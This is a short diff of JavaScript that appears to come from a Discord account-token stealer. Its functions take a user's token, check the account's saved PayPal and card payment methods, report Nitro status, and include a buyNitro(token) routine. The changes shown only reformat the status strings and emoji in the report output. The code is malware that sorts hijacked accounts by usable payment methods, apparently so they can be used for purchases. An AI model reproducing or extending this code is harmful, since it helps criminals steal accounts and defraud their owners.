@@ -192,18 +192,18 @@ const fetchBilling = async (token) => {
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
-  if (data === "") return "❌";
+  if (data === "") return "\`None\`";
   let billing = "";
   data.forEach((x) => {
     if (x.type === 2 && !x.invalid) {
-      billing += "✅" + " <:paypal:951139189389410365>";
+      billing += "\`Valid:\`" + " <:paypal:973924768933875722>";
     } else if (x.type === 1 && !x.invalid) {
-      billing += "✅" + " 💳";
+      billing += "\`Valid:\`" + "<:card:973868127240732673>";
     } else {
-      billing = "❌";
+      billing = "\`Invalid\`";
     }
   });
-  if (billing === "") billing = "❌";
+  if (billing === "") billing = "\`None\`";
   return billing;
 };
 
@@ -262,13 +262,13 @@ const buyNitro = async (token) => {
 const getNitro = (flags) => {
   switch (flags) {
     case 0:
-      return "No Nitro";
+      return "\`None\`";
     case 1:
-      return "Nitro Classic";
+      return "<:nitro:969573901036290069>";
     case 2:
-      return "Nitro Boost";
+      return "\`Nitro Boost\`";
     default:
-      return "No Nitro";
+      return "\`None\`";
   }
 };
 
